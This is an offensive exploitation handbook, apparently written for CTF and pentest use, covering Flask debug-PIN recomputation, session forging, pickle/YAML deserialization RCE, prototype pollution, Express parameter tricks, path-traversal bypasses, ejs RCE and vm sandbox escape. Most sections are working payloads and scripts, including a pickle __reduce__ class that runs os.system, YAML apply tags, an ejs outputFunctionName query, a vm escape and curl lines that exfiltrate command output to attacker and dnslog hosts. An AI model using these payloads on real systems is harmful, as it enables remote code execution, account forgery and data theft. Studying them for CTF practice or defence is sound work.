## [g-python] Python——Flask 调试台、Session 伪造与反序列化

### [py-flask-debug-pin] Flask 调试 PIN 与 Werkzeug 控制台 | hard | flask;werkzeug;debug-pin | PIN
> 开了 debug 的 Flask 在报错页暴露 Werkzeug 交互控制台，PIN 由机器指纹可复现地推导，登录控制台即 RCE。

#### 这个条目的作用
调试模式（`debug=True`）下 Flask 会把异常渲染成 Werkzeug 交互式调试器：能看到完整堆栈、还能执行任意 Python 表达式。控制台被 9 位 PIN 保护，但 PIN 不是随机的——它由「机器指纹 + 进程信息」经 sha1 确定性算出。只要能读到这些指纹（通常靠 LFI/任意文件读），就能在本地复算出 PIN，登录控制台直接拿到任意代码执行。

#### 前置条件
- 目标 Flask 开了 debug：`app.run(debug=True)`、`FLASK_DEBUG=1` 或调试环境变量。
- 能触发一次异常看到调试页（发一个让视图函数抛错的请求即可）。
- 有任意文件读/LFI 拿到指纹文件（拿不到也能枚举候选，见第 6 步）。
- 尽量确认 werkzeug 版本（决定生成脚本细节，2.3+/3.x 有调整）。

#### 第 1 步：确认 debug 并触发控制台
发一个会抛异常的请求。404 不触发调试器，要让视图函数内部抛错：传非法类型、让 `int()` 报错等。
```txt
GET /?a=abc            # 视图里 int(request.args['a']) 抛 ValueError
GET /__debugger__      # 部分版本调试器有独立入口页
```
预期结果：响应是调试页 HTML，含 "The debugger caught an exception in your WSGI application"、完整堆栈和 PIN 输入框；若只是普通 500/404 说明 debug 没开。如果不行：确认服务端确实 `debug=True`（docker 里常见 `FLASK_DEBUG=1`）；前端代理可能吞掉 500，看原始响应体。

#### 第 2 步：收集 PIN 生成要素
经典算法（werkzeug 2.x 早期）把以下字段依次拼进 sha1：
- `probably_public_bits = [username, 'flask.app', 'Flask', flask/app.py 的绝对路径]`
- `private_bits = [MAC 地址（整数转 str）, machine_id]`
machine_id 依次尝试：`/etc/machine-id` → `/proc/sys/kernel/random/boot_id` → 容器里再取 `/proc/self/cgroup`（末段）。username 就是进程用户，docker 里几乎都是 `root`，可从 `/etc/passwd` 确认。

#### 第 3 步：LFI 读指纹文件
```txt
/etc/machine-id                       # 或 /proc/sys/kernel/random/boot_id
/proc/self/cgroup                     # 容器环境，取形如 docker-<64位hex> 那段
/sys/class/net/eth0/address           # MAC，去冒号后按 16 进制转整数
/proc/net/arp | /proc/net/route       # 拿不到 eth0 时的备选
```
MAC 转整数：`int('0242ac110002', 16)`——`uuid.getnode()` 返回的就是这个整数。注意 docker 容器里 `eth0` 的 MAC 与宿主机不同，必须读容器自己的。

#### 第 4 步：本地跑 PIN 生成脚本
```python
import hashlib

def gen_pin(username, modname, appname, moddir, node_mac, machine_id):
    h = hashlib.sha1()
    for bit in (username, modname, appname, moddir, node_mac, machine_id):
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'pinsalt')
    return ('%09d' % int(h.hexdigest(), 16))[:9]

# 参数全部来自第 2、3 步收集的信息
print(gen_pin('root', 'flask.app', 'Flask',
              '/usr/local/lib/python3.8/site-packages/flask/app.py',
              str(int('0242ac110002', 16)),
              open('/etc/machine-id').read().strip()))
```
预期结果：输出 9 位数字 PIN。如果不行：machine_id 换 boot_id / cgroup 末段再跑；MAC 换其他网卡；werkzeug 版本不同时算法有调整，先确认版本再改脚本。

#### 第 5 步：登录控制台执行命令
在调试页输入 PIN，通过后控制台就是运行在服务端进程里的 Python shell（带 Flask app 上下文）。
```python
__import__('os').popen('id').read()
__import__('subprocess').check_output('id', shell=True).decode()
```
预期结果：返回 `uid=0(root)...`。控制台交互不可靠时直接写文件再读回：`open('/tmp/x','w').write('pwn')`。

#### 第 6 步（可选）：读不到指纹的退化路线
- 部分要素已知时枚举候选：标准 docker 镜像的 machine-id/boot_id 常见值、cgroup 段，组合出几个候选 PIN 一个个试。
- 纯暴破 9 位数字不现实（调试器有重试限制会锁），但 debug 模式异常会触发自动 reload，重载后重试计数重置。

> [!warn] 版本分水岭：werkzeug 2.3 起 PIN 相关实现有调整（username/machine_id 获取逻辑变化），3.x 继续演进；先拿目标版本号，再找对应年份的生成脚本，算法以目标版本源码为准。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 输入 PIN 被拒 | 算错或版本不匹配 | 换 machine-id/boot_id/cgroup 候选，确认 werkzeug 版本 |
| 生成的 PIN 位数不对 | 脚本拼了多余字段 | 严格按六段 + pinsalt 拼接 |
| 只有 500 没有调试器 | debug 未开或代理吞错误页 | 看原始响应体，确认 FLASK_DEBUG |
| 容器里 MAC 对不上 | 读到了宿主机网卡 | 从容器内 /sys/class/net 读自己的 |
| 试几次 PIN 被锁 | 调试器有重试限制 | 触发异常让 debug 自动 reload 重置计数 |

#### 实战要点
1. 先确认 debug：错误页有没有完整堆栈一眼可辨。
2. 指纹读取顺序：machine-id → boot_id → cgroup；MAC 用容器内网卡；docker 里 username 基本是 root。
3. 指纹不全时枚举候选（标准镜像值）比暴破现实。
4. 控制台里优先 `__import__('os')`，别依赖顶层名字。
5. PIN 只保护调试器本身，能读文件往往已经能绕掉大半限制，别只盯 PIN。

### [py-flask-session-forge] Flask Session 伪造（弱 secret） | medium | flask;session;itsdangerous | secret-key
> Flask 的 session 是客户端 cookie（base64 + 签名），服务端不存会话；只要 SECRET_KEY 弱、可猜或已泄露，就能签出任意身份。

#### 这个条目的作用
Flask 默认把 session 整个塞进浏览器 cookie：内容是 base64（JSON 载荷）+ 时间戳 + HMAC 签名，可读不可改。服务端每次只验签名、不查数据库。所以签名密钥 `SECRET_KEY` 是唯一防线——密钥弱、可猜或泄露 = 伪造任意 session（管理员、任意 uid）。

#### 前置条件
- 目标用 Flask 默认 session（cookie 名 `session`，默认 JSON 序列化）。
- 能拿到一个合法 session cookie（登录后抓包即可，甚至不用）。
- SECRET_KEY 弱口令/可猜/已从源码或泄露点拿到（见第 3 步）。

#### 第 1 步：确认 session 结构并解码
```txt
eyJ1c2VybmFtZSI6Imd1ZXN0In0.Zxxxxx.xxxxxxxxxxxx
└── base64(JSON) ──┘ └时间戳┘ └──签名──┘
```
```bash
echo 'eyJ1c2VybmFtZSI6Imd1ZXN0In0' | base64 -d   # {"username":"guest"}
```
预期结果：看到明文载荷（用户名、角色字段）。改动任意字节后服务端会拒绝——签名对不上。如果不行：确认 cookie 名不是自定义的（`SESSION_COOKIE_NAME`）。

#### 第 2 步：撞 secret（弱密钥）
```bash
pip install flask-unsign
flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6Imd1ZXN0In0.Zxxxxx.xxxx' --wordlist rockyou.txt
echo -e "secret\nkey\ndev\nflask\ns3cret" | flask-unsign --unsign --cookie <cookie> --no-literal-eval
```
预期结果：输出 `[*] Session decodes to: {...}` 和 `Secret key: 'xxx'`。如果不行：换项目名、机器名、完整 rockyou 等字典再撞。

#### 第 3 步：从泄露点找 secret（比撞库快）
- 源码/配置：`.env`、`config.py`、`settings.py`、docker-compose、README、CI 变量。
- Git 历史：`git log -p --all | grep -i secret`——密钥常被提交后又删，历史里还在。
- 报错/调试信息/环境变量回显：有 SSTI 或命令执行时直接读 `os.environ`。
- 常规弱口令：`secret`、`key`、`dev`、`flask`、`s3cret`、项目名。

#### 第 4 步：签出伪造 session
```bash
flask-unsign --sign --cookie "{'username':'admin','role':'admin'}" --secret 's3cret'
```
预期结果：输出一串新 cookie，替换请求里的 `session` 字段后即成为 admin。如果不行：确认字段名与目标代码判断一致（有时是 `is_admin`、`uid`、`user_id`）；目标若用自定义 serializer，payload 格式会不同。

#### 第 5 步：手写等价物（无 flask-unsign / 需精确控制）
```python
from itsdangerous import URLSafeTimedSerializer

# Flask 的默认 salt 就是 'cookie-session'，漏掉会签出服务端不认的 cookie
s = URLSafeTimedSerializer('s3cret', salt='cookie-session')
print(s.dumps({'username': 'admin', 'role': 'admin'}))
```
预期结果：输出与 flask-unsign 结构一致的新 cookie。itsdangerous 是 Flask 自带依赖，无需安装。

> [!warn] 有效期：Flask 按 `PERMANENT_SESSION_LIFETIME`（默认 31 天）校验时间戳。`dumps` 默认不带过期，签完立刻用最稳；要长期有效可把旧 cookie 的时间戳字段原样抄过来。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 替换后 session 变空/回未登录 | secret 不对或 salt 缺失 | 确认 `salt='cookie-session'`、密钥抄对 |
| 报 BadSignature / 400 | 载荷被改或签名无效 | 重新 sign，别手改 base64 段 |
| 伪造成功但权限没变 | 判断字段猜错 | 读源码看 `session['xxx']` 到底查哪个键 |
| 撞库秒失败 | 字典不含目标密钥 | 优先找源码/环境变量泄露点 |

#### 实战要点
1. 有任意文件读先翻 `.env` / `config.py`，比撞库快一个量级。
2. secret 常在 git 历史里：删掉的 commit 往往躺着明文密钥。
3. 伪造前先读一处源码确认角色字段名，别瞎猜。
4. 老题 cookie 可能是 pickle 序列化（不是 JSON），那种直接就是反序列化 RCE，见 py-pickle-yaml-rce。

### [py-pickle-yaml-rce] pickle/YAML 反序列化 RCE 与 send_file 穿越 | hard | pickle;yaml;deserialization | __reduce__
> `pickle.load`、`yaml.load` 解析不可信输入等于远程代码执行；`send_file` 参数直接可控时是现成的任意文件读。

#### 这个条目的作用
pickle 与 PyYAML 的「不安全加载」会把输入里的对象构造指令当成代码执行；Flask 的 `send_file` 若直接吃用户路径，则是不设防的任意文件读。三者都是「输入即信任」写进代码的经典漏洞，任意文件读又常常是后续 RCE 的信息铺垫。

#### 前置条件
- 找到反序列化入口：`pickle.load/loads(用户输入)`、`yaml.load(输入)`、SocketServer 自定义协议、Redis 缓存值回读等。
- 或找到 `send_file(request.args[...])` 这类透传路径的接口。
- 出网能力（可选）：无回显时外带结果。

#### 第 1 步：确认入口可触发
```txt
# 传畸形数据看是否抛反序列化异常
pickle 入口：提交 b'garbage'，期望 UnpicklingError
yaml 入口：提交 "a: 1"，能解析出 dict 即说明进了 yaml 解析
```
预期结果：服务端报错或正常解析，证明输入进了反序列化函数。如果不行：找别的入口（session cookie、缓存键、消息队列、`cloudpickle`/`dill` 封装点）。

#### 第 2 步：构造 pickle RCE payload
```python
import os, pickle

class Evil:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

print(pickle.dumps(Evil()))
# 输出是 bytes，按传输方式再 base64 / urllib.parse.quote 编码
```
手写等价 opcode（在线工具/手搓时用）：
```txt
cos
system
(S'id'
tR.
```
预期结果：目标机器 `/tmp/pwned` 出现 id 输出（配合文件读回/外带确认）。无回显时外带：
```python
class Evil:
    def __reduce__(self):
        return (__import__('subprocess').check_output,
                ('curl http://attacker/$(whoami)',))
```
如果不行：`os.system` 被禁就换 `eval` 拼 `__import__`；输入被 str 化/编码时按目标格式先编码再传。

#### 第 3 步：构造 yaml RCE payload
```yaml
!!python/object/apply:os.system ["id > /tmp/pwned"]
```
```yaml
!!python/object/apply:subprocess.check_output [["id"]]
```
预期结果：`yaml.load(data)`（5.1+ 需 `Loader=UnsafeLoader`）解析后执行命令；`yaml.safe_load` 会拒绝 `!!python` 标签直接报错——正好用来判断加载器。PyYAML < 5.1 的 `yaml.load` 默认就危险。

> [!danger] 判断加载器：向入口传带 `!!python` 标签的输入，能构造对象 = 非安全加载器；抛错 = safe，换思路。

#### 第 4 步：无回显的外带与写读
```txt
# 命令执行无回显：curl / dnslog 外带
curl http://attacker.dnslog.cn/$(id | base64 -w0)
# 或写文件再经任意文件读接口拿
id > /tmp/pwned
```
预期结果：attacker 侧收到请求或文件内容。如果不行：目标不出网就写文件配合 LFI 读，或把结果带进异常消息（`raise Exception(open('flag').read())` 类技巧）。

#### 第 5 步：send_file 任意文件读
```python
return send_file(request.args.get('f'))   # 危险写法：路径完全可控
```
```txt
?f=/etc/passwd
?f=../../etc/passwd          # 相对路径从 root_path 出发
?f=/proc/self/cmdline
```
预期结果：直接回显文件内容。`send_from_directory` 内部用 safe_join 拦 `..`，`send_file` 不做目录限制；新版 Flask/Werkzeug 对含 `..` 的路径可能收紧，先试绝对路径 `/etc/passwd` 再试 `../`。无回显时看响应头（Content-Type/Content-Disposition）或触发报错泄露路径。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 提交后报 UnpicklingError | payload 编码错 | base64/quote 后再传，先本地解码验证 |
| 命令执行了但没结果 | 无回显 | dnslog/curl 外带，或写文件再读 |
| yaml 标签被拒 | 用了 safe_load | 确认入口是 `yaml.load`（5.1+ 需 UnsafeLoader） |
| send_file 返回 404 | 新版路径收紧/目录不对 | 改试绝对路径、/proc/self/cmdline |
| 报错里没有执行痕迹 | 入口解析了但没真正 load | 追数据流，确认 load 被调用 |

#### 实战要点
1. pickle 优先 `os.system` 写文件 + 配合文件读接口回显，比外带稳。
2. `yaml.safe_load` 是安全默认；见到 `yaml.load` 先看版本再决定 payload 形态。
3. send_file 读文件优先 `/etc/passwd` 验证，再读 `/proc/self/cmdline`、源码扩大战果。
4. 反序列化入口不一定叫 load：SocketServer 协议、缓存框架、`cloudpickle`/`dill` 都是同类。
5. 出网探测永远先行：一个 dnslog 请求就能确认执行点，避免盲打。

## [g-node] Node.js——原型污染、参数解析差异与模板/VM RCE

### [node-prototype-pollution] 原型污染 | medium | prototype-pollution;merge;__proto__ | PP
> 递归合并/深拷贝没过滤 `__proto__` 与 `constructor.prototype` 键时，Object.prototype 被整体污染，所有对象凭空多出属性，可再升级成 RCE。

#### 这个条目的作用
JavaScript 里几乎所有对象都继承自 `Object.prototype`。如果合并/拷贝函数把 `__proto__` 或 `constructor.prototype` 当普通键写进去，等于给「所有对象」加属性：`({}).isAdmin` 凭空变 true，再配合模板引擎/子进程选项就能打成 RCE。Node 后端和浏览器前端都会中招。

#### 前置条件
- 找到递归合并/深拷贝/参数展开点：手写 merge、`_.merge`/`_.defaultsDeep`（lodash）、`deepmerge`、Object.assign（浅层）、qs/body-parser 解析出的嵌套对象。
- 一个能把 JSON/表单键名送进合并函数的接口（更新配置、批量赋值、`Object.assign(req.body, ...)` 类）。

#### 第 1 步：找合并点
典型危险代码：
```js
function merge(dst, src) {
  for (const k of Object.keys(src)) {
    if (typeof src[k] === 'object' && src[k] !== null && !Array.isArray(src[k]))
      merge(dst[k], src[k]);
    else
      dst[k] = src[k];
  }
}
// 接口：app.post('/update', (req,res) => { merge(settings, req.body); ... })
```
预期结果：确认 `req.body`（或 query）整体进入 merge。如果不行：搜 `_.merge(`、`deepmerge(`、`Object.assign(`、`$.extend(` 找其他入口。

#### 第 2 步：探测污染（三连）
```json
{"__proto__": {"polluted": true}}
```
```js
// 合并后访问任意空对象：
({}).polluted === true
Object.prototype.polluted === true
```
预期结果：响应/日志里看到 `true`（或后续判断被污染属性影响）。如果不行：换 `constructor.prototype` 写法：
```json
{"constructor": {"prototype": {"polluted": true}}}
```
再不行说明合并函数过滤了 `__proto__` 键（现代 lodash 会拦），换入口。

> [!warn] `__proto__` 是访问器不是普通键：`JSON.parse('{"__proto__":...}')` 得到的只是普通字符串键，不会污染；必须经 merge 这类「赋值路径」才会触发原型 setter。

#### 第 3 步：确认攻击面
污染是「全局加属性」，要找到下游读属性的地方才有价值：
- 权限判断：`if (user.isAdmin)`、`if (req.query.admin)`。
- 模板引擎 options（ejs 链见 node-traversal-ejs-vm）。
- `child_process` 的 `shell` / `argv0` / env 选项（见第 4 步）。

#### 第 4 步：污染 → RCE 两条经典链
```json
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('id').toString())//"}}
```
```json
{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ"}}
```
第 1 条：后续任何 `exec/execSync` 以字符串命令触发时，子进程用被污染的 `shell`（node 自己）启动，`argv0` 里的 JS 被执行。第 2 条：若请求头能进环境变量（CGI 类部署），`NODE_OPTIONS=--require /proc/self/environ` 让新起的 node 子进程把环境当模块 require。
预期结果：目标回显 `uid=...`。如果不行：确认应用确实会 spawn 子进程（`exec`/`spawn`/`fork` 点），否则链不触发。

#### 第 5 步：检测与修复要点
```js
// 修复：合并时跳过危险键
const SAFE = new Set(['__proto__', 'constructor', 'prototype']);
function safeMerge(dst, src) {
  for (const k of Object.keys(src)) {
    if (SAFE.has(k)) continue;
    if (typeof src[k] === 'object' && src[k]) safeMerge(dst[k], src[k]);
    else dst[k] = src[k];
  }
}
```
另外：用 `Object.create(null)` 存键控数据、升级 lodash/deepmerge 到修复版、对不可信 JSON 先 `Object.freeze(Object.prototype)` 再解析。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `({}).polluted` 是 undefined | 合并函数过滤了 `__proto__` | 试 `constructor.prototype` 写法、换入口 |
| body 里塞 `__proto__` 被中间件吃掉 | body-parser/qs 有保护 | 试 query 参数 `?__proto__[x]=1`、JSON 与表单两种 |
| 污染成功但没 RCE | 下游没有可用读取点 | 先找 spawn/模板渲染点，再选链 |
| 报 Cannot set property | 严格模式/原型被冻结 | 换入口或换链 |

#### 实战要点
1. 先探测（`{}` 凭空多属性）再谈利用；探测失败换 `constructor.prototype`。
2. `__proto__` 只在「合并/展开」路径生效，`JSON.parse` 本身安全。
3. RCE 链依赖下游行为：有 `exec/spawn` 才有 shell 链，有模板渲染才有 ejs 链。
4. 修复标准就是合并时过滤 `__proto__`/`constructor`/`prototype` 三键，白名单式最稳。
5. 浏览器端原型污染同样致命：XSS、逻辑绕过、前端权限类应用重点自查。

### [node-express-param] Express 参数解析差异 | medium | express;query-parser;parameter-pollution | qs
> Express 的 query/body 解析（qs）与 Nginx、其他中间件解析不一致时，同名参数、嵌套键能覆盖或逃过上层校验。

#### 这个条目的作用
一个请求经过「网关（Nginx/WAF/API 网关）→ 应用」多层解析，每层对同一个 URL 的解析结果不同：同名参数谁覆盖谁、`a[b]` 是嵌套对象还是字面键、数组怎么表示。校验层和应用层口径一旦不一致，就能用特殊构造的参数逃过上层检查，拿到本不该有的值。

#### 前置条件
- 目标 Node/Express 应用：`req.query` / `req.body` 参与鉴权、黑白名单、取值。
- 前面有网关或代理（Nginx、WAF、API 网关），它按自己的规则取参。
- 知道应用用 qs（express 4 默认 extended）还是 querystring（express 5 默认 simple）。

#### 第 1 步：确认解析器
```js
console.log(app.get('query parser'));  // 'extended' → qs；'simple' → querystring
```
也可以直接探测：`GET /?a[b]=1`，看响应里 `req.query.a` 是对象 `{b:'1'}`，还是根本没有 `a`（键名变成字面 `'a[b]'`）。预期结果：确定用哪套规则，后续 payload 按此构造。如果不行：查 express 版本（4 默认 qs，5 默认 querystring）。

#### 第 2 步：记住两侧解析差异
| 输入 | qs（express 4 默认） | querystring（express 5 默认） |
| --- | --- | --- |
| `?a=1&a=2` | `{a:['1','2']}`（数组） | `{a:['1','2']}`（也是数组！） |
| `?a[b]=1` | `{a:{b:'1'}}`（嵌套对象） | 字面键 `'a[b]'` |
| `?a[]=1&a[]=2` | `{a:['1','2']}` | 字面键 `'a[]'` 的数组 |
| `?a=` | `''`（空串，falsy） | 同上 |

> [!warn] 同名参数在 Node 两侧都是数组——真正「后覆盖」的是 PHP `parse_str`，「取第一个值」的是 Nginx `$arg_xxx`。跨层不一致主要发生在「网关 vs Node」之间。

#### 第 3 步：网关与应用的取值错位
```txt
# Nginx 校验取第一个值、Node 应用取数组/其他元素
GET /admin?id=1&id=2
# Nginx $arg_id = '1'（第一个值）；应用 req.query.id = ['1','2']
# 若应用逻辑是 req.query.id[1]，网关校验 id==1 就形同虚设
```
```txt
# 黑名单词绕过：网关拦 role=admin（第一个值），应用 includes 全查
GET /x?role=user&role=admin
# Nginx $arg_role='user' 不拦；Node req.query.role=['user','admin'] → includes('admin') 为 true
```
预期结果：上层校验通过、应用侧拿到攻击值。如果不行：确认网关到底取哪个值（Nginx 取第一个、PHP 取最后一个、Node 取数组），按实际组合调换参数顺序。

#### 第 4 步：truthy 判定与空值坑
```js
if (req.query.admin) { /* 放行 */ }
```
```txt
?admin=0        # '0' 是字符串，truthy → 进入
?admin=false    # 'false' truthy → 进入
?admin=         # 空串 falsy → 不进入（和直觉相反！）
```
预期结果：`?admin=0` 能进、`?admin=` 进不去。如果不行：确认没有 `=== 'true'` 之类的强比较，强比较时换 `?admin=1` 直球。

#### 第 5 步：body 与 query 同键、嵌套键与数组化
```txt
POST /login?user=admin&role=user
Content-Type: application/x-www-form-urlencoded
user=hacker&role=admin
# req.query.user='admin'，req.body.user='hacker'，读取优先级取决于中间件顺序
```
```txt
POST /config   # qs 解析 body 的嵌套键
{"a":{"b":{"c":"x"}}}   # 或表单 a[b][c]=x
```
预期结果：同一键名 query/body 并存、嵌套结构可表达。这类输入是原型污染（node-prototype-pollution）与越权判断错位的温床。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| payload 没生效 | 解析器判断错（extended/simple） | 先探测 `?a[b]=1` 确认规则 |
| 网关也拿到数组 | 网关是同类解析器 | 换键名/嵌套/编码再试 |
| `?admin=0` 进不去 | 代码是 `==='0'` 或强类型校验 | 按代码实际判断构造 |
| body 里的嵌套键没解析 | 中间件不是 urlencoded/json | 确认 body-parser 挂载与 Content-Type |
| 上层是 PHP 网关 | PHP 取最后一个值 | 参数顺序反着放 |

#### 实战要点
1. 先探测解析器（`?a[b]=1`、`?a=1&a=2` 看响应结构），再设计 payload。
2. 跨层不一致是核心：搞清网关取第几个值、应用取数组还是元素。
3. `'0'`、`'false'` 是 truthy 字符串，空串才是 falsy——布尔判断题常客。
4. query 与 body 同键并存时优先级随中间件顺序变，实弹前本地复现。
5. express 5 默认 simple（querystring），与老教程里的 qs 行为不同，先看版本。

### [node-traversal-ejs-vm] 路径规范化绕过、ejs RCE 与 vm 逃逸 | hard | path-traversal;ejs;vm | template-injection
> `..` 过滤只看字符串就总能绕；ejs 把用户输入当 options 渲染即 RCE；vm 不是安全沙箱。

#### 这个条目的作用
三个独立但常一起出现的 Node 漏洞：① 路径拼接 + 黑名单过滤 `..` 的任意文件读；② ejs 模板引擎把用户可控的 options 当代码拼接的 RCE；③ vm 沙箱逃逸拿 `process`。任意文件读常是第一步信息铺垫，ejs/vm 是拿到 RCE 的收尾。

#### 前置条件
- 文件读接口：`fs.readFileSync(path.join(...))` 类，参数可控。
- 模板渲染接口：res.render 的 options 含用户输入，或模板内容本身可控。
- Node 版本信息（影响 vm 逃逸可用链与 ejs 版本判断）。

#### 第 1 步：路径拼接 → 任意文件读
```js
fs.readFileSync(path.join(DIR, req.query.f));   // 危险写法
```
```txt
?f=../../../../etc/passwd
?f=..%2f..%2f..%2fetc%2fpasswd          # 编码斜杠
?f=..%252f..%252f..%252fetc%252fpasswd  # 二次编码（前有解码器时）
?f=....//....//etc/passwd                # 双斜杠/多点绕过字符串过滤
?f=..;/etc/passwd                        # 分号（部分解析器当参数分隔）
```
预期结果：回显 `/etc/passwd`。如果不行：换编码组合、试反斜杠 `..\..\`（Windows 后端）、大小写、`%2e%2e%2f`。

#### 第 2 步：绕过字符串过滤的通用思路
过滤只匹配 `..` 字面量时，目标是「最终解析结果仍是上级路径」：
| 输入 | 绕过点 |
| --- | --- |
| `..%2f` | 斜杠编码后解码 |
| `..%252f` | 双重编码，两层解码 |
| `....//` | 过滤 `..` 后剩 `..//` 仍上跳 |
| `..././` | 中间 `.` 被规范化 |
| `%2e%2e%5c` | Windows 反斜杠 |
| `..;` | 部分解析器把 `;` 当参数分隔 |

#### 第 3 步：正确修复姿势
```js
const root = path.resolve(DIR);
const p = path.resolve(root, req.query.f);
if (p !== root && !p.startsWith(root + path.sep)) throw new Error('403');
// 注意：只写 p.startsWith(root) 会被 /var/www-evil 这类兄弟目录绕过（缺分隔符）
```
预期结果：合法路径放行、`..` 一律 403。

#### 第 4 步：ejs RCE（用户可控 options）
```txt
GET /?settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');s
```
触发条件：路由把 `req.query` 之类传进 `res.render(tpl, options)`，ejs 用 `settings['view options']` 里的字段拼模板代码。预期结果：响应/日志出现 `uid=...`。如果不行：
- 先探测模板注入：模板内容可控时试 `<%= 7*7 %>`，回显 49 说明数据流通，再走 `outputFunctionName`/`escapeFunction` 链。
- ejs ≥ 3.1.7 已修 `outputFunctionName` 注入（CVE-2022-29078），3.1.9 全面收紧；只有老版本可打。

> [!warn] 版本决定成败：ejs < 3.1.7 才有 `settings[view options]` 链；新版本换思路（原型污染 + ejs 渲染、或找其他渲染点）。

#### 第 5 步：vm 沙箱逃逸
```js
vm.runInNewContext("this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()");
```
原理：sandbox 的全局对象 `this` 的 `constructor` 是宿主环境的 Object，`Object.constructor` 是宿主 Function——用它构造新函数就拿到了宿主作用域，`process` 直接外泄。新版 Node 等价写法：
```js
globalThis.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()
```
`mainModule` 弃用/移除后：走 `process.binding('spawn_sync')` 构造，或经宿主 `require('module')` 链拿 require。vm 只隔离全局变量，从不隔离能力——别拿它当安全边界。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `..` 被挡 | 过滤在解码前 | 编码轮次对齐：一层过滤一层解码就 %252f |
| ejs payload 无反应 | 版本 ≥3.1.7 或 options 不可控 | 先 `<%= 7*7 %>` 探测，确认数据流 |
| vm 逃逸报 mainModule undefined | Node 新版本移除 | 用 process.binding / globalThis 链 |
| 逃逸后没有 require | 沙箱内拿不到宿主 require | 先 `return process` 再 `.mainModule`，别在沙箱里直接 require |
| 文件读到了但没权限 | 进程权限低 | 读 /proc/self/environ、/proc/self/cmdline 找密钥 |

#### 实战要点
1. 路径题先试原始 `../` 再逐层加编码，记录「哪一层解一次码」。
2. 过滤 `..` 的题几乎总能绕：双斜杠、编码、分号、反斜杠换着来。
3. ejs 先探测模板注入（`<%= 7*7 %>` → 49），再选链；版本 ≥3.1.7 别浪费时间。
4. vm 逃逸一句话：`this.constructor.constructor('return process')()`，剩下都是 require 的姿势问题。
5. 读文件优先 `/etc/passwd` 验证，再 `/proc/self/environ`、源码、`.env` 扩大战果。
